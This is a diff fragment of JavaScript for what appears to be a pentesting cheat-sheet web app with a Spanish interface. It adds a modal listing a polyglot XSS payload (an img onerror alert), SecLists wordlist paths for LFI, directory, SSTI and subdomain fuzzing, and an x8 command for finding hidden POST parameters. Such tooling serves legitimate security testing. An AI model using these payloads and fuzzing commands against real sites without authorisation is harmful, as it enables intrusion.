+  {code:"'\"><img src=x onerror=alert(1)>", d:"Polyglot XSS básico — rompe atributo y contexto HTML", save:true},
+];
+const DICT_WORDLISTS=[
+  {label:'LFI', path:'/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt'},
+  {label:'Directorios', path:'/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'},
+  {label:'Template engines / SSTI', path:'/usr/share/seclists/Fuzzing/template-engines-*.txt'},
+  {label:'Subdominios DNS', path:'/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'},
+];
+const DICT_X8='x8 -u "http://IP/index.php" -w /ruta/diccionario -X POST';
+
+function dictCard(code, desc, save, cat){
+  const cj=jarg(code);
+  const saveBtn=save?`<button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${cj},${jarg(desc||'')},"web",${jarg(cat||'Payloads')},"web-exploitation",["web-exploitation"])'>💾</button>`:'';
+  return `<div class="enum-cmd-card">
+    <div class="enum-cmd-row" style="align-items:flex-start;">
+      <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(code)}</div>
+      <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
+      ${saveBtn}
+    </div>
+    ${desc?`<div class="enum-cmd-desc">${esc(desc)}</div>`:''}
+  </div>`;
+}
+
+function openDictModal(){
+  let html='';
+  html+=`<div class="wv-sec-title pay" style="margin-top:6px;">Payloads polyglot</div>`;
+  html+=DICT_POLYGLOTS.map(p=>dictCard(p.code,p.d,p.save,'Polyglot')).join('');
+
+  html+=`<div class="wv-sec-title det" style="margin-top:14px;">Diccionarios recomendados (SecLists)</div>`;
+  html+=DICT_WORDLISTS.map(w=>{
+    const cj=jarg(w.path);
+    return `<div class="enum-cmd-card">
+      <div class="enum-cmd-row" style="align-items:center;">
+        <span style="font-size:10px;font-family:var(--mono);color:var(--purple);min-width:150px;flex-shrink:0;">${esc(w.label)}</span>
+        <div class="enum-cmd-code" style="word-break:break-all;">${esc(w.path)}</div>
+        <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
+      </div>
+    </div>`;
+  }).join('');
+
+  html+=`<div class="wv-sec-title byp" style="margin-top:14px;">Parámetros ocultos (x8)</div>`;
+  html+=dictCard(DICT_X8,'Fuzzing de parámetros POST ocultos con x8','true','Web Exploitation');
+
+  document.getElementById('dictBody').innerHTML=html;
+  document.getElementById('dictModal').classList.add('show');
 }
 
 async function saveNmapResult(btn){
